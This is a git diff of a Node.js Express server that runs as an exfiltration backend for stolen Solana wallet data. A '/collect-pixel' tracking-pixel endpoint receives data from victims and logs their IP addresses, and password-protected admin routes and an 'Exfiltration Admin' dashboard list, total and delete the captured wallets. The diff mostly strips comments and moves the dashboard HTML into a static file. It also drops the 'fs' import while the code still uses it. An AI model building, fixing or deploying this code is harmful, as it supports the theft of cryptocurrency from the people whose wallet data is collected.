@@ -5,7 +5,6 @@ const cors = require('cors');
 const helmet = require('helmet');
 const rateLimit = require('express-rate-limit');
 const path = require('path');
-const fs = require('fs');
 
 const app = express();
 const PORT = process.env.PORT || 3001;
@@ -20,7 +19,7 @@ app.use(express.urlencoded({ extended: true }));
 const limiter = rateLimit({
     windowMs: 15 * 60 * 1000,
     max: 100,
-    trustProxy: true,  // Required for Render's proxy
+    trustProxy: true,
     keyGenerator: (req) => {
         return req.ip || req.connection.remoteAddress;
     }
@@ -31,7 +30,6 @@ app.use('/api/', limiter);
 // POSTGRESQL DATABASE CONNECTION
 // ========================================
 
-// PostgreSQL connection pool
 const pool = new Pool({
     user: process.env.DB_USER || 'exfil_user',
     password: process.env.DB_PASSWORD || 'exfil123',
@@ -44,7 +42,6 @@ const pool = new Pool({
     ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false
 });
 
-// Test database connection and create tables
 async function initDatabase() {
     let retries = 5;
     while (retries > 0) {
@@ -52,7 +49,6 @@ async function initDatabase() {
             const client = await pool.connect();
             console.log('✅ PostgreSQL Connected Successfully');
             
-            // Create main wallets table
             await client.query(`
                 CREATE TABLE IF NOT EXISTS wallets (
                     id SERIAL PRIMARY KEY,
@@ -70,7 +66,6 @@ async function initDatabase() {
                 )
             `);
             
-            // Create indexes
             await client.query(`CREATE INDEX IF NOT EXISTS idx_collected_at ON wallets(collected_at DESC)`);
             await client.query(`CREATE INDEX IF NOT EXISTS idx_wallet_address ON wallets(wallet_address)`);
             await client.query(`CREATE INDEX IF NOT EXISTS idx_user_id ON wallets(user_id)`);
@@ -95,7 +90,6 @@ async function initDatabase() {
 // API ROUTES
 // ========================================
 
-// Health check endpoint
 app.get('/health', async (req, res) => {
     let dbStatus = 'disconnected';
     try {
@@ -113,11 +107,9 @@ app.get('/health', async (req, res) => {
     });
 });
 
-// MAIN EXFILTRATION ENDPOINT
 app.get('/collect-pixel', async (req, res) => {
     const { d, r } = req.query;
     const timestamp = new Date();
-    // Get the real IP from Render's proxy headers
     const ip = req.headers['x-forwarded-for'] ? req.headers['x-forwarded-for'].split(',')[0].trim() : req.socket.remoteAddress;
     const userAgent = req.headers['user-agent'];
     
@@ -193,7 +185,6 @@ app.get('/collect-pixel', async (req, res) => {
         
         console.log('='.repeat(80) + '\n');
         
-        // Return 1x1 pixel GIF
         const pixel = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
         res.writeHead(200, {
             'Content-Type': 'image/gif',
@@ -208,7 +199,6 @@ app.get('/collect-pixel', async (req, res) => {
     }
 });
 
-// POST endpoint alternative
 app.post('/collect-pixel', async (req, res) => {
     const { data, referrer } = req.body;
     const ip = req.headers['x-forwarded-for'] ? req.headers['x-forwarded-for'].split(',')[0].trim() : req.socket.remoteAddress;
@@ -276,7 +266,6 @@ const adminAuth = (req, res, next) => {
     next();
 };
 
-// Get all wallets with pagination
 app.get('/api/wallets', adminAuth, async (req, res) => {
     try {
         const page = parseInt(req.query.page) || 1;
@@ -308,7 +297,6 @@ app.get('/api/wallets', adminAuth, async (req, res) => {
     }
 });
 
-// Get statistics
 app.get('/api/stats', adminAuth, async (req, res) => {
     try {
         const totalWallets = await pool.query('SELECT COUNT(*) as count FROM wallets');
@@ -334,7 +322,6 @@ app.get('/api/stats', adminAuth, async (req, res) => {
     }
 });
 
-// Delete wallet
 app.delete('/api/wallets/:id', adminAuth, async (req, res) => {
     try {
         const result = await pool.query('DELETE FROM wallets WHERE id = $1 RETURNING id', [req.params.id]);
@@ -347,7 +334,6 @@ app.delete('/api/wallets/:id', adminAuth, async (req, res) => {
     }
 });
 
-// Clear all data
 app.delete('/api/clear-all', adminAuth, async (req, res) => {
     try {
         await pool.query('TRUNCATE TABLE wallets RESTART IDENTITY');
@@ -357,127 +343,28 @@ app.delete('/api/clear-all', adminAuth, async (req, res) => {
     }
 });
 
+// ========================================
+// SERVE ADMIN DASHBOARD (FROM public FOLDER)
+// ========================================
+
 // Ensure public directory exists
 const publicDir = path.join(__dirname, 'public');
 if (!fs.existsSync(publicDir)) {
     fs.mkdirSync(publicDir, { recursive: true });
 }
 
-// Create admin HTML file
-const adminHtmlPath = path.join(publicDir, 'admin.html');
-const adminHtml = `<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Exfiltration Admin</title>
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        body{font-family:'Courier New',monospace;background:#0a0a0a;color:#00ff00;padding:20px}
-        .container{max-width:1400px;margin:0 auto}
-        .header{background:#1a1a1a;padding:20px;border-radius:10px;margin-bottom:20px;border:1px solid #00ff00}
-        .stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:20px;margin-bottom:20px}
-        .stat-card{background:#1a1a1a;padding:20px;border-radius:10px;border:1px solid #333}
-        .stat-value{font-size:32px;font-weight:bold;color:#00ff00;margin-top:10px}
-        .login-form{background:#1a1a1a;padding:40px;border-radius:10px;max-width:400px;margin:100px auto;text-align:center}
-        input{width:100%;padding:10px;margin:10px 0;background:#2a2a2a;border:1px solid #444;color:#00ff00}
-        button{background:#00ff00;color:#0a0a0a;padding:10px 20px;border:none;cursor:pointer;font-weight:bold;margin:5px}
-        table{width:100%;border-collapse:collapse;background:#1a1a1a}
-        th,td{padding:12px;text-align:left;border-bottom:1px solid #333}
-        th{background:#2a2a2a}
-        .delete-btn{background:#ff0000;color:white;padding:5px 10px}
-        .copy-btn{background:#0066cc;color:white;padding:3px 8px;margin-left:5px;border:none;border-radius:3px;cursor:pointer}
-        .pagination{margin-top:20px;text-align:center}
-    </style>
-</head>
-<body>
-<div class="container" id="app">
-<div id="loginScreen">
-<div class="login-form">
-<h2>🔐 Admin Login</h2>
-<input type="text" id="username" placeholder="Username">
-<input type="password" id="password" placeholder="Password">
-<button onclick="login()">Login</button>
-</div>
-</div>
-<div id="dashboard" style="display:none">
-<div class="header">
-<h1>🚀 Exfiltration Server</h1>
-<button onclick="logout()">Logout</button>
-<button onclick="clearAllData()" style="background:#ff0000">Clear All</button>
-<button onclick="refreshData()">Refresh</button>
-</div>
-<div class="stats-grid" id="stats"></div>
-<div style="overflow-x:auto">
-<table>
-<thead><tr><th>Time</th><th>Wallet Address</th><th>Balance</th><th>User ID</th><th>IP</th><th>Action</th></tr></thead>
-<tbody id="walletsBody"></tbody>
-</table>
-</div>
-<div class="pagination" id="pagination"></div>
-</div>
-</div>
-<script>
-let token=null,currentPage=1;
-async function login(){
-    const u=document.getElementById('username').value;
-    const p=document.getElementById('password').value;
-    token=btoa(u+':'+p);
-    const r=await fetch('/api/stats',{headers:{'Authorization':'Basic '+token}});
-    if(r.ok){
-        document.getElementById('loginScreen').style.display='none';
-        document.getElementById('dashboard').style.display='block';
-        refreshData();
-    }else alert('Invalid credentials');
-}
-function logout(){token=null;document.getElementById('loginScreen').style.display='block';document.getElementById('dashboard').style.display='none';}
-async function refreshData(){if(!token)return;await loadStats();await loadWallets();}
-async function loadStats(){
-    const r=await fetch('/api/stats',{headers:{'Authorization':'Basic '+token}});
-    const d=await r.json();
-    if(d.success)document.getElementById('stats').innerHTML=\`
-        <div class="stat-card"><div>💰 Total Wallets</div><div class="stat-value">\${d.stats.totalWallets}</div></div>
-        <div class="stat-card"><div>👤 Unique Users</div><div class="stat-value">\${d.stats.uniqueUsers}</div></div>
-        <div class="stat-card"><div>💎 Total Balance</div><div class="stat-value">\${parseFloat(d.stats.totalBalance).toFixed(4)} SOL</div></div>
-        <div class="stat-card"><div>📊 Last 24h</div><div class="stat-value">\${d.stats.last24hExfiltrations}</div></div>
-    \`;
-}
-async function loadWallets(){
-    const r=await fetch('/api/wallets?page='+currentPage,{headers:{'Authorization':'Basic '+token}});
-    const d=await r.json();
-    if(d.success&&d.data.length){
-        document.getElementById('walletsBody').innerHTML=d.data.map(w=>\`
-            <tr>
-                <td>\${new Date(w.collected_at).toLocaleString()}</td>
-                <td style="font-family:monospace;font-size:11px">\${w.wallet_address.substring(0,30)}...</td>
-                <td>\${parseFloat(w.balance).toFixed(4)} SOL</td>
-                <td>\${w.user_id||'N/A'}</td>
-                <td>\${w.ip_address}</td>
-                <td><button class="delete-btn" onclick="deleteWallet(\${w.id})">Delete</button></td>
-            </tr>
-        \`).join('');
-        document.getElementById('pagination').innerHTML=\`
-            <button onclick="changePage(\${currentPage-1})" \${currentPage===1?'disabled':''}>Prev</button>
-            Page \${currentPage} of \${d.pagination.pages}
-            <button onclick="changePage(\${currentPage+1})" \${currentPage===d.pagination.pages?'disabled':''}>Next</button>
-        \`;
-    }else document.getElementById('walletsBody').innerHTML='<tr><td colspan="6">No wallets found</td></tr>';
-}
-function changePage(p){currentPage=p;loadWallets();}
-async function deleteWallet(id){if(confirm('Delete?')){await fetch('/api/wallets/'+id,{method:'DELETE',headers:{'Authorization':'Basic '+token}});refreshData();}}
-async function clearAllData(){if(confirm('Delete ALL data?')){await fetch('/api/clear-all',{method:'DELETE',headers:{'Authorization':'Basic '+token}});refreshData();}}
-</script>
-</body>
-</html>`;
+// Serve static files from public folder
+app.use(express.static(publicDir));
 
-fs.writeFileSync(adminHtmlPath, adminHtml);
-
-// Serve admin dashboard
+// Admin route - serves the admin.html file from public folder
 app.get('/admin', (req, res) => {
-    res.sendFile(adminHtmlPath);
+    const adminHtmlPath = path.join(publicDir, 'admin.html');
+    if (fs.existsSync(adminHtmlPath)) {
+        res.sendFile(adminHtmlPath);
+    } else {
+        res.status(404).send('admin.html not found. Please create it in the public folder.');
+    }
 });
-
-app.use(express.static('public'));
 
 // ========================================
 // START SERVER
